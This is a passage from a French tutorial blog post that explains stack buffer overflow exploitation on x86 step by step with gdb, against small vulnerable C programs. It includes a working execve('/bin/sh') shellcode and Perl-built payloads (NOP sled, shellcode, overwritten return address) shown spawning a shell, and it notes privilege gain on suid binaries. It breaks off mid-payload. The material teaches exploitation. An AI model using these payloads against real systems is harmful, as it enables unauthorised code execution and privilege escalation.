<span class="o">(</span>gdb<span class="o">)</span> i r <span class="nv">$eip</span> <span class="nv">$esp</span> <span class="nv">$ebp</span>
eip            0x80483fa    0x80483fa &lt;func+6&gt;
esp            0xbffffbf0    0xbffffbf0
ebp            0xbffffc48    0xbffffc48
</code></pre></div></div>

<p>Nous n’avons avancé que d’une instruction, mais elle est très importante. C’est cette instruction qui alloue l’espace requis pour le buffer, ainsi que pour les variables qu’il aura besoin d’ajouter à la pile, telle que l’adresse de notre chaine de caractère qui va être passée à l’appel système <code class="highlighter-rouge">strcpy</code>. L’instruction assembleur retire <code class="highlighter-rouge">0x58</code> (soit 88) octets à l’adresse contenue dans <code class="highlighter-rouge">ESP</code>. En d’autres termes, elle décale le sommet de la pile et la fait grossir de 88 octets.</p>

<p>À la ligne <code class="highlighter-rouge">+6</code>,</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=&gt; 0x080483fa &lt;+6&gt;:     mov    eax,DWORD PTR [ebp+0x8]
</code></pre></div></div>

<p>l’instruction cherche l’adresse qui est à l’adresse <code class="highlighter-rouge">EBP+8</code>, puis assigne le contenu pointé par cette adresse à <code class="highlighter-rouge">EAX</code>. Nous savons que <code class="highlighter-rouge">EBP</code> pointe sur la base du stack frame de la fonction. Donc <code class="highlighter-rouge">EBP+4</code> est la sauvegarde de <code class="highlighter-rouge">EIP</code>, et <code class="highlighter-rouge">EBP+8</code> est l’adresse du pointeur sur notre chaine de caractère. Donc <code class="highlighter-rouge">EAX</code> va contenir l’adresse de notre chaine de caractère.</p>

<p>La ligne suivante, <code class="highlighter-rouge">+9</code>, copie le contenu de <code class="highlighter-rouge">EAX</code> (donc l’adresse de notre chaine de caractère), dans <code class="highlighter-rouge">ESP+4</code>, c’est à dire dans la case mémoire juste avant le sommet de la pile.</p>

<p>Enfin, les instructions aux lignes <code class="highlighter-rouge">+13</code> et <code class="highlighter-rouge">+16</code> mettent sur le sommet de la pile l’adresse du début de buffer, qui se trouve à <code class="highlighter-rouge">EBP - 0x48</code>. Le buffer qui sera alloué a alors une taille de <code class="highlighter-rouge">EBP - (EBP - 0x48) = 0x48</code> octets (donc 72 octets)</p>

<p>Ce qu’il y a des ces 72 octets n’a pas d’importance puisqu’ils ne seront pas lus tant que le buffer n’aura pas été rempli par un contenu.</p>

<p>Vous avez suivi ? Allez, comme je suis sympa, je me suis fendu d’un beau schéma pour comprendre l’état de la pile juste avant d’appeler <code class="highlighter-rouge">strcpy</code> pour résumer l’état actuel.</p>

<p><a href="/assets/uploads/2015/03/stack4.png"><img src="/assets/uploads/2015/03/stack4.png" alt="Stack" /></a></p>

<p>C’est un peu plus clair ? Essayez de reprendre mes explications avec ce schéma en tête, ça sera surement plus facile de revenir une deuxième fois dessus.</p>

<p>Un peu de mathématiques font que nous avons finalement un décalage total de 88 octets, ce qui signifie qu’il y un décalage de 22 <code class="highlighter-rouge">quadri-octets</code> appelés <code class="highlighter-rouge">dword</code> (taille d’une adresse). Donc si nous avons un décalage de 22 <code class="highlighter-rouge">dwords</code>, et que nous affichons les 24 premiers éléments de la pile, nous devrions retomber sur nos pattes et trouver en dernières positions notre sauvegarde de <code class="highlighter-rouge">EBP</code> et <code class="highlighter-rouge">EIP</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> x/24xw <span class="nv">$esp</span>
0xbffffbf0:    0xb7fffa54    0x00000000    0xb7fe1b48    0x00000001
0xbffffc00:    0x00000000    0x00000001    0xb7fff8f8    0xb7fd6ff4
0xbffffc10:    0xb7f983e9    0xb7ec40f5    0xbffffc28    0xb7eabab5
0xbffffc20:    0xb7fd6ff4    0x0804960c    0xbffffc38    0x080482ec
0xbffffc30:    0xb7ff1380    0x0804960c    0xbffffc68    0x08048479
0xbffffc40:    0xb7fd7324    0xb7fd6ff4    0xbffffc68    0x08048446
<span class="c">#                                            ^^^^^^^^      ^^^^^^^^</span>
<span class="c">#                                              sEBP          sEIP</span>
</code></pre></div></div>

<p>Et c’est le cas ! La fin de la dernière ligne contient bien les deux adresses escomptées <code class="highlighter-rouge">sEBP</code> et <code class="highlighter-rouge">sEIP</code>. Les 72 octets qui précèdent sont prévus pour le buffer, et les 16 premiers pour l’appel à <code class="highlighter-rouge">strcpy</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> c
Continuing.

Breakpoint 4, 0x0804840c <span class="k">in </span>func <span class="o">()</span>

<span class="o">(</span>gdb<span class="o">)</span> disass func
Dump of assembler code <span class="k">for function </span>func:
   0x080483f4 &lt;+0&gt;:     push   ebp
   0x080483f5 &lt;+1&gt;:     mov    ebp,esp
   0x080483f7 &lt;+3&gt;:     sub    esp,0x58
   0x080483fa &lt;+6&gt;:     mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8]
   0x080483fd &lt;+9&gt;:     mov    DWORD PTR <span class="o">[</span>esp+0x4],eax
   0x08048401 &lt;+13&gt;:    lea    eax,[ebp-0x48]
   0x08048404 &lt;+16&gt;:    mov    DWORD PTR <span class="o">[</span>esp],eax
   0x08048407 &lt;+19&gt;:    call   0x8048320 &lt;strcpy@plt&gt;
<span class="o">=&gt;</span> 0x0804840c &lt;+24&gt;:    lea    eax,[ebp-0x48]
   0x0804840f &lt;+27&gt;:    mov    DWORD PTR <span class="o">[</span>esp],eax
   0x08048412 &lt;+30&gt;:    call   0x8048330 &lt;puts@plt&gt;
   0x08048417 &lt;+35&gt;:    leave
   0x08048418 &lt;+36&gt;:    ret
End of assembler dump.

<span class="o">(</span>gdb<span class="o">)</span> i r <span class="nv">$eip</span> <span class="nv">$esp</span> <span class="nv">$ebp</span>
eip            0x804840c    0x804840c &lt;func+24&gt;
esp            0xbffffbf0    0xbffffbf0
ebp            0xbffffc48    0xbffffc48

<span class="o">(</span>gdb<span class="o">)</span> x/24xw <span class="nv">$esp</span>
0xbffffbf0:    0xbffffc00    0xbffffe35    0xb7fe1b48    0x00000001
0xbffffc00:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc10:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc20:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc30:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc40:    0x41414141    0x41414141    0x41414141    0x08004141
<span class="c">#                                            ^^^^^^^^      ^^^^^^^^</span>
<span class="c">#                                          EBP écrasé    EIP écrasé</span>
</code></pre></div></div>

<p>Nous continuons donc, et nous breakons sur l’instruction qui suit l’appel système <code class="highlighter-rouge">strcpy</code>, qui copie le contenu de la variable que nous avons passée en argument (les <code class="highlighter-rouge">"A"</code>) dans le buffer.</p>

<p>Comme on le voit sur la pile, les deux premiers éléments sont les deux paramètres que nous avons passés à strcpy. <code class="highlighter-rouge">0xbffffc00</code> est l’adresse de début de buffer, qui est bien le commencement des <code class="highlighter-rouge">0x41</code>, et le deuxième est l’adresse de notre chaine de caractère en mémoire, comme nous l’avons vu au début.</p>

<p>Mais rappelez-vous, nous n’avions prévu qu’un buffer de 64 octets, et nous lui en avons passés 78 ! Il risque d’y avoir problème. On examine alors le haut de la pile comme au breakpoint précédent, et nous remarquons que tout l’espace alloué pour le buffer a été rempli… et qu’il a même débordé ! La sauvegarde de <code class="highlighter-rouge">EBP</code> a été écrasée par nos <code class="highlighter-rouge">"A"</code> (représenté par leur valeur <code class="highlighter-rouge">0x41</code> ASCII), et notre enregistrement de <code class="highlighter-rouge">EIP</code>, appelé ici <code class="highlighter-rouge">sEIP</code> a été partiellement réécrit. Il est devenu <code class="highlighter-rouge">0x08004141</code>. Comme la notation est en Little Endian, les cases mémoire sont en fait : <code class="highlighter-rouge">0x41</code> <code class="highlighter-rouge">0x41</code> <code class="highlighter-rouge">0x00</code> <code class="highlighter-rouge">0x08</code>. Donc nous avons les deux derniers <code class="highlighter-rouge">"A"</code> de notre variable, suivit de l’octet nul qui marque la fin d’une chaine de caractère.</p>

<p>Si ce débordement de buffer (buffer overflow) ne dérange pas le processeur dans l’immédiat, il va se trouver embêter lorsqu’il devra réutiliser la valeur sauvegardée de <code class="highlighter-rouge">EIP</code> pour pouvoir reprendre le cours de son exécution.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> <span class="k">continue
</span>Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 5, 0x08048418 <span class="k">in </span>func <span class="o">()</span>
<span class="o">(</span>gdb<span class="o">)</span> <span class="k">continue
</span>Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x08004141 <span class="k">in</span> ?? <span class="o">()</span>

</code></pre></div></div>

<p>Et voilà. Le processeur a bien voulu afficher la chaine dans son intégralité en s’arrêtant au caractère nul, mais lorsqu’il a voulu réutiliser la version sauvegardée de <code class="highlighter-rouge">EIP</code>, il est tombé sur l’adresse <code class="highlighter-rouge">0x08004141</code>. Et malheureusement, il n’a pas le droit d’accéder à cette adresse mémoire. Le <code class="highlighter-rouge">SEGFAULT</code> est inévitable !</p>

<p>Comme nous l’avons dit dans la partie théorique, nous pouvons réécrire la valeur enregistrée de <code class="highlighter-rouge">EIP</code> pour pouvoir rediriger le fil d’exécution du programme. Mais où rediriger cette exécution ? Et bien vers le début d’un shellcode. Un shellcode est une chaine de caractères qui représente une suite d’instructions machine qui, en s’exécutant, ouvrira un shell. (Le terme shellcode est devenu un peu plus générique, puisque qu’il désigne maintenant n’importe quelle chaine d’instruction machine)</p>

<p>Nous pourrions décrire ici comment écrire un shellcode, mais ce n’est pas le but de cet article. Des notions plus avancées d’assembleur sont nécessaires et si nous voulions faire le tour du sujet, un article ne suffirait pas. C’est pourquoi nous allons prendre un shellcode tout fait, disponible sur internet, fonctionnant pour une architecture x86 :</p>

<blockquote>
  <p>\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh</p>
</blockquote>

<p>Rapidement, cette suite d’instruction exécute l’appel système <code class="highlighter-rouge">execve</code> en lui passant comme argument la chaine de caractères <code class="highlighter-rouge">"/bin/sh"</code>, puis fait un appel à l’appel système <code class="highlighter-rouge">exit</code>.</p>

<p>Il s’agit donc de faire exécuter cette suite d’instructions au programme. Le nombre d’octets nécessaires pour stocker cette suite est de 45 octets (38 caractères sous la forme \x?? et les 7 caractères imprimables <code class="highlighter-rouge">/</code>, <code class="highlighter-rouge">b</code>, <code class="highlighter-rouge">i</code>, <code class="highlighter-rouge">n</code>, <code class="highlighter-rouge">/</code>, <code class="highlighter-rouge">s</code>, <code class="highlighter-rouge">h</code>.</p>

<p>Et voici comment placer tout cela :</p>

<p><a href="/assets/uploads/2015/03/img_54f78559832ab.png"><img src="/assets/uploads/2015/03/img_54f78559832ab.png" alt="img_54f78559832ab" /></a></p>

<p>Nous avons ici une représentation horizontale de la pile. À gauche, nous avons le sommet de la pile, et plus nous allons à droite, plus nous descendons dans la pile. Lorsque <code class="highlighter-rouge">strcpy</code> écrit dans le buffer, il écrit de gauche à droite, jusqu’à remplacer la sauvegarde de <code class="highlighter-rouge">EBP</code> puis de <code class="highlighter-rouge">EIP</code>.</p>

<ul>
  <li>Il s’agit alors de remplir une <strong>première partie</strong> du buffer avec l’instruction <code class="highlighter-rouge">\x90</code>. En assembleur, cette instruction veut dire <strong>ne fait rien avec moi, passe à l’instruction suivante</strong>. C’est l’instruction <code class="highlighter-rouge">NOP</code> (No OPeration).</li>
  <li>La <strong>seconde partie</strong> du buffer contient le shellcode, que nous voulons que le programme exécute.</li>
  <li>La <strong>troisième partie</strong> contient l’adresse que l’on contrôle.</li>
</ul>

<p>Nous allons alors faire en sorte que le programme tombe dans la première partie, le pool de <code class="highlighter-rouge">NOP</code>. En effet, si on tombe au milieu des NOP, alors le programme va aller à l’instruction suivante, qui est un NOP, puis la suivante etc. jusqu’à arriver au début du shellcode, et va l’exécuter dans son intégralité. C’est seulement une manière de rendre l’exécution plus souple, puisque n’importe quelle adresse dans les <code class="highlighter-rouge">NOP</code> convient.</p>

<p>Pour connaitre le nombre de <code class="highlighter-rouge">NOP</code> possible, il faut faire un petit calcul :</p>

<p>Nous avons vu précédemment que la taille du buffer alloué pour <code class="highlighter-rouge">strcpy</code> était de 72 octets. Mais pour écraser la sauvegarde de <code class="highlighter-rouge">EIP</code>, nous devons d’abord écraser la sauvegarde de EBP, donc 4 octets de plus, ce qui font 76 octets.</p>

<p>Cela veut dire que si on écrit 76 octets, alors on aura tout écrasé jusqu’à <code class="highlighter-rouge">EIP</code>, <code class="highlighter-rouge">EIP</code> non inclus.</p>

<p>Si on en écrit deux de plus (78, comme dans l’exemple), alors deux octets de EIP seront écrasés (enfin 3, si on prend le caractère nul de fin de chaine). J’avais fait ce travail en amont pour l’exemple, c’est pourquoi j’avais choisi 78 octets !</p>

<p>Ces caractères doivent se finir par le shellcode (ce n’est pas obligatoire, mais c’est le plus pratique !). Or nous avons dit que le shellcode comptait 45 octets. Ainsi, nous devons insérer 76 - 45 = 31 <code class="highlighter-rouge">NOP</code>, donc 31 fois la valeur <code class="highlighter-rouge">\x90</code>.</p>

<p>Enfin, pour trouver l’adresse qui écrasera la sauvegarde de EIP, rappelons-nous l’état de la stack :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> x/24xw <span class="nv">$esp</span>
0xbffffbf0:    0xbffffc00    0xbffffe35    0xb7fe1b48    0x00000001
0xbffffc00:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc10:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc20:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc30:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc40:    0x41414141    0x41414141    0x41414141    0x08004141
</code></pre></div></div>

<p>Les NOPS seront donc entre l’adresse <code class="highlighter-rouge">0xbffffc00</code> et <code class="highlighter-rouge">0xbffffc00 + 31 = 0xbffffc1f</code>. Pour être sûr de tomber dedans, prenons l’adresse <code class="highlighter-rouge">0xbffffc10</code></p>

<p>Finalement, nous allons envoyer :</p>

<ul>
  <li>31 x NOP</li>
  <li>Shellcode</li>
  <li>0xbffffc10</li>
</ul>

<p>Nous ponvous écrire cela en Perl de la manière suivante (en n’oubliant pas, pour l’adresse, la notation Little Endian)</p>

<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span> <span class="p">"</span><span class="err">\</span><span class="s2">x90</span><span class="p">"</span><span class="nv">x31</span> <span class="o">.</span> <span class="p">"</span><span class="err">\</span><span class="s2">xeb</span><span class="err">\</span><span class="s2">x1f</span><span class="err">\</span><span class="s2">x5e</span><span class="err">\</span><span class="s2">x89</span><span class="err">\</span><span class="s2">x76</span><span class="err">\</span><span class="s2">x08</span><span class="err">\</span><span class="s2">x31</span><span class="err">\</span><span class="s2">xc0</span><span class="err">\</span><span class="s2">x88</span><span class="err">\</span><span class="s2">x46</span><span class="err">\</span><span class="s2">x07</span><span class="err">\</span><span class="s2">x89</span><span class="err">\</span><span class="s2">x46</span><span class="err">\</span><span class="s2">x0c</span><span class="err">\</span><span class="s2">xb0</span><span class="err">\</span><span class="s2">x0b</span><span class="err">\</span><span class="s2">x89</span><span class="err">\</span><span class="s2">xf3</span><span class="err">\</span><span class="s2">x8d</span><span class="err">\</span><span class="s2">x4e</span><span class="err">\</span><span class="s2">x08</span><span class="err">\</span><span class="s2">x8d</span><span class="err">\</span><span class="s2">x56</span><span class="err">\</span><span class="s2">x0c</span><span class="err">\</span><span class="s2">xcd</span><span class="err">\</span><span class="s2">x80</span><span class="err">\</span><span class="s2">x31</span><span class="err">\</span><span class="s2">xdb</span><span class="err">\</span><span class="s2">x89</span><span class="err">\</span><span class="s2">xd8</span><span class="err">\</span><span class="s2">x40</span><span class="err">\</span><span class="s2">xcd</span><span class="err">\</span><span class="s2">x80</span><span class="err">\</span><span class="s2">xe8</span><span class="err">\</span><span class="s2">xdc</span><span class="err">\</span><span class="s2">xff</span><span class="err">\</span><span class="s2">xff</span><span class="err">\</span><span class="s2">xff/bin/sh</span><span class="p">"</span> <span class="o">.</span> <span class="p">"</span><span class="err">\</span><span class="s2">x10</span><span class="err">\</span><span class="s2">xfc</span><span class="err">\</span><span class="s2">xff</span><span class="err">\</span><span class="s2">xbf</span><span class="p">"</span>
</code></pre></div></div>

<p>En le lançant dans gdb, on obtient alors le résultat suivant :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> run <span class="sb">`</span>perl <span class="nt">-e</span> <span class="s1">'print "\x90"x31 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x10\xfc\xff\xbf"'</span><span class="sb">`</span>
Starting program: /tmp/hackndo/binary <span class="sb">`</span>perl <span class="nt">-e</span> <span class="s1">'print "\x90"x31 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x10\xfc\xff\xbf"'</span><span class="sb">`</span>
��������������������������������^�1�F�F
                                       �
                                        ���V
                                             ̀1ۉ�@̀�����/bin/sh���
process 20353 is executing new program: /bin/dash

<span class="nv">$ </span>
</code></pre></div></div>

<p>Voilà, nous avons utilisé la vulnérabilité pour ouvrir un shell. Si le binaire est suid, ce shell aura les droits du propriétaire du binaire lorsque la vulnérabilité sera exploitée hors gdb.</p>

<p>Vous avez suivi jusque là ? Bien joué !</p>

<hr />

<h3 id="cas-2">Cas 2</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="n">printf</span><span class="p">(</span><span class="s">"binary </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">else</span> <span class="n">func</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Ce programme est presque similaire au programme précédant, cependant cette fois-ci la taille allouée au buffer n’est que de 8 octets. A cause de cela, l’espace n’est plus suffisant pour pouvoir y injecter notre shellcode.</p>

<p>Pour en être sûr, étudions le nouveau code assembleur associé à ce programme</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> disass main
Dump of assembler code <span class="k">for function </span>main:
   0x08048419 &lt;+0&gt;:     push   ebp
   0x0804841a &lt;+1&gt;:     mov    ebp,esp
   0x0804841c &lt;+3&gt;:     and    esp,0xfffffff0
   0x0804841f &lt;+6&gt;:     sub    esp,0x10
   0x08048422 &lt;+9&gt;:     cmp    DWORD PTR <span class="o">[</span>ebp+0x8],0x2
   0x08048426 &lt;+13&gt;:    je     0x8048436 &lt;main+29&gt;
   0x08048428 &lt;+15&gt;:    mov    DWORD PTR <span class="o">[</span>esp],0x8048510
   0x0804842f &lt;+22&gt;:    call   0x8048330 &lt;puts@plt&gt;
   0x08048434 &lt;+27&gt;:    jmp    0x8048446 &lt;main+45&gt;
   0x08048436 &lt;+29&gt;:    mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc]
   0x08048439 &lt;+32&gt;:    add    eax,0x4
   0x0804843c &lt;+35&gt;:    mov    eax,DWORD PTR <span class="o">[</span>eax]
   0x0804843e &lt;+37&gt;:    mov    DWORD PTR <span class="o">[</span>esp],eax
   0x08048441 &lt;+40&gt;:    call   0x80483f4 
   0x08048446 &lt;+45&gt;:    mov    eax,0x0
   0x0804844b &lt;+50&gt;:    leave
   0x0804844c &lt;+51&gt;:    ret
End of assembler dump.

<span class="o">(</span>gdb<span class="o">)</span> disass func
Dump of assembler code <span class="k">for function </span>func:
   0x080483f4 &lt;+0&gt;:     push   ebp
   0x080483f5 &lt;+1&gt;:     mov    ebp,esp
   0x080483f7 &lt;+3&gt;:     sub    esp,0x28
   0x080483fa &lt;+6&gt;:     mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8]
   0x080483fd &lt;+9&gt;:     mov    DWORD PTR <span class="o">[</span>esp+0x4],eax
   0x08048401 &lt;+13&gt;:    lea    eax,[ebp-0x10]
   0x08048404 &lt;+16&gt;:    mov    DWORD PTR <span class="o">[</span>esp],eax
   0x08048407 &lt;+19&gt;:    call   0x8048320 &lt;strcpy@plt&gt;
   0x0804840c &lt;+24&gt;:    lea    eax,[ebp-0x10]
   0x0804840f &lt;+27&gt;:    mov    DWORD PTR <span class="o">[</span>esp],eax
   0x08048412 &lt;+30&gt;:    call   0x8048330 &lt;puts@plt&gt;
   0x08048417 &lt;+35&gt;:    leave
   0x08048418 &lt;+36&gt;:    ret
End of assembler dump.
<span class="o">(</span>gdb<span class="o">)</span>
</code></pre></div></div>

<p>C’est exactement le même que celui du cas 1, sauf que cette fois-ci, dans le code assembleur de <code class="highlighter-rouge">func</code>, on remarque que l’espace réellement alloué pour notre buffer est de <code class="highlighter-rouge">0x10</code> (16) octets. Notre shellcode étant composé de 45 octets, nous ne pourrons pas l’injecter ici.</p>

<p>Le plus simple est alors de faire exactement la même démarche que pour le premier cas, sauf que nous injecterons notre shellcode <strong>après</strong> la sauvegarde de EIP, comme le montre le schéma suivant :</p>

<p><a href="/assets/uploads/2015/03/img_54f78478da290.png"><img src="/assets/uploads/2015/03/img_54f78478da290.png" alt="img_54f78478da290" /></a></p>

<p>Le pool de <code class="highlighter-rouge">NOP</code> (<code class="highlighter-rouge">\x9</code>0) n’est là que pour ‘assurer’ le coup, il n’est pas nécessaire. Viser une plage de 200 <code class="highlighter-rouge">NOP</code> est plus simple que viser l’adresse exacte de début de shellcode. Cependant, nous allons tout de même le faire sans, sinon ça serait trop simple !</p>

<p>Les premières étapes du cas 1 sont toujours valables. Refaisons notre petit calcul. On voit dans les instructions assembleur que 0x10 octets (donc 16) sont réservés pour le buffer pour <code class="highlighter-rouge">strcpy</code>. Si nous ajoutons la taille de <code class="highlighter-rouge">EBP</code>, cela fait 20 octets. On peut vérifier ce calcul simplement en envoyant une chaine de 22 caractères, et en vérifiant que <code class="highlighter-rouge">EIP</code> a été écrasé à moitié :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> run <span class="sb">`</span>perl <span class="nt">-e</span> <span class="s1">'print "A"x22'</span><span class="sb">`</span>
Starting program: /tmp/hackndo/binary <span class="sb">`</span>perl <span class="nt">-e</span> <span class="s1">'print "A"x22'</span><span class="sb">`</span>
AAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x08004141 <span class="k">in</span> ?? <span class="o">()</span>
<span class="o">(</span>gdb<span class="o">)</span>
</code></pre></div></div>

<p>Nous voyons que le programme a tenté d’accéder à l’adresse mémoire 0x08004141. Donc les deux derniers caractères de notre chaine dépassent sur la sauvegarde de <code class="highlighter-rouge">EIP</code>. Il y a donc deux caractères en trop, ce qui fait bien 20 octets avant d’écraser <code class="highlighter-rouge">EIP</code> (sans compter le caractère null). Il faut donc pour notre payload :</p>

<ul>
  <li>20 caractères (quels qu’ils soient)</li>
  <li>L’adresse qui suit l’adresse à laquelle est sauvegardée EIP</li>
  <li>(Le pool de NOP, mais nous allons faire sans)</li>
  <li>Le shellcode</li>
</ul>

<p><a href="/assets/uploads/2015/03/img_54f78d2d9a419.png"><img src="/assets/uploads/2015/03/img_54f78d2d9a419.png" alt="img_54f78d2d9a419" /></a></p>

<p>Pour connaitre l’adresse de la sauvegarde de <code class="highlighter-rouge">EIP</code> (et donc l’adresse qui suit), faisons un breakpoint juste après que <code class="highlighter-rouge">EIP</code> est poussé sur la pile, c’est à dire à la première instruction de <code class="highlighter-rouge">func</code> et regardons la valeur de <code class="highlighter-rouge">ESP</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> <span class="k">*</span>0x080483f4
Breakpoint 1 at 0x80483f4
<span class="o">(</span>gdb<span class="o">)</span> run <span class="sb">`</span>perl <span class="nt">-e</span> <span class="s1">'print "A"x69'</span><span class="sb">`</span>
The program being debugged has been started already.
Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
Starting program: /tmp/hackndo/binary A

Breakpoint 1, 0x080483f4 <span class="k">in </span>func <span class="o">()</span>

<span class="o">(</span>gdb<span class="o">)</span> i r <span class="nv">$esp</span>
esp            0xbffffc4c    0xbffffc4c

<span class="o">(</span>gdb<span class="o">)</span> x/4xw <span class="nv">$esp</span>
0xbffffc4c:    0x08048446    0xbffffe81    0xb7ff1380    0x0804846b

<span class="o">(</span>gdb<span class="o">)</span>
</code></pre></div></div>

<p><em>Mais pourquoi lancer <code class="highlighter-rouge">run</code> avec 69 <code class="highlighter-rouge">"A"</code>, plutôt que de lancer <code class="highlighter-rouge">run</code> sans argument ?</em></p>

<p>Il est important de se poser cette question. En effet, nous sommes en train de chercher une adresse précise d’une variable sur la pile. Il est important de passer 69 <code class="highlighter-rouge">"A"</code> en argument car c’est la longueur totale de notre payload que nous enverrons pour exploiter le buffer overflow (20 octets contenant le buffer et <code class="highlighter-rouge">EBP + 4</code> octets pour l’écrasement de <code class="highlighter-rouge">EIP + 45</code> octets de shellcode).  Or, avant la pile se trouvent les variables d’environnement et les arguments du programme (dont son nom).</p>

<p><a href="/assets/uploads/2015/03/img_54f81318e37b8.png"><img src="/assets/uploads/2015/03/img_54f81318e37b8.png" alt="img_54f81318e37b8" /></a></p>

<p>Donc si on modifie la taille des arguments passés au programme, ça décalera la pile, donc les adresses que l’on recherche. C’est pourquoi il est indispensable de rester dans le même contexte d’exécution, en envoyant un argument qui soit toujours de la même taille, que ce soit pendant nos recherches ou pendant notre exploitation.</p>

<p>Cela étant dit, revenons au résultat de notre breakpoint : <code class="highlighter-rouge">ESP</code> a pour valeur <code class="highlighter-rouge">0xbffffc4c</code>, et on vérifie bien qu’à cette adresse se trouve <code class="highlighter-rouge">0x08048446</code>, qui est la valeur sauvegardée de <code class="highlighter-rouge">EIP</code> (puisque c’est l’adresse de l’instruction qui suit le <code class="highlighter-rouge">call</code> de <code class="highlighter-rouge">func</code>). Il va donc falloir faire pointer cette sauvegarde de <code class="highlighter-rouge">EIP</code> vers l’adresse suivante, qui contiendra notre shellcode, c’est à dire l’adresse <code class="highlighter-rouge">0xbffffc50</code>.</p>

<p>Nous avons donc notre payload, qui , en perl, est de la forme :</p>

<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span> <span class="p">"</span><span class="s2">A</span><span class="p">"</span><span class="nv">x20</span> <span class="o">.</span> <span class="p">"</span><span class="err">\</span><span class="s2">x50</span><span class="err">\</span><span class="s2">xfc</span><span class="err">\</span><span class="s2">xff</span><span class="err">\</span><span class="s2">xbf</span><span class="p">"</span> <span class="o">.</span> <span class="p">"</span><span class="err">\</span><span class="s2">xeb</span><span class="err">\</span><span class="s2">x1f</span><span class="err">\</span><span class="s2">x5e</span><span class="err">\</span><span class="s2">x89</span><span class="err">\</span><span class="s2">x76</span><span class="err">\</span><span class="s2">x08</span><span class="err">\</span><span class="s2">x31</span><span class="err">\</span><span class="s2">xc0</span><span class="err">\</span><span class="s2">x88</span><span class="err">\</span><span class="s2">x46</span><span class="err">\</span><span class="s2">x07</span><span class="err">\</span><span class="s2">x89</span><span class="err">\</span><span class="s2">x46</span><span class="err">\</span><span class="s2">x0c</span><span class="err">\</span><span class="s2">xb0</span><span class="err">\</span><span class="s2">x0b</span><span class="err">\</span><span class="s2">x89</span><span class="err">\</span><span class="s2">xf3</span><span class="err">\</span><span class="s2">x8d</span><span class="err">\</span><span class="s2">x4e</span><span class="err">\</span><span class="s2">x08</span><span class="err">\</span><span class="s2">x8d</span><span class="err">\</span><span class="s2">x56</span><span class="err">\</span><span class="s2">x0c</span><span class="err">\</span><span class="s2">xcd</span><span class="err">\</span><span class="s2">x80</span><span class="err">\</span><span 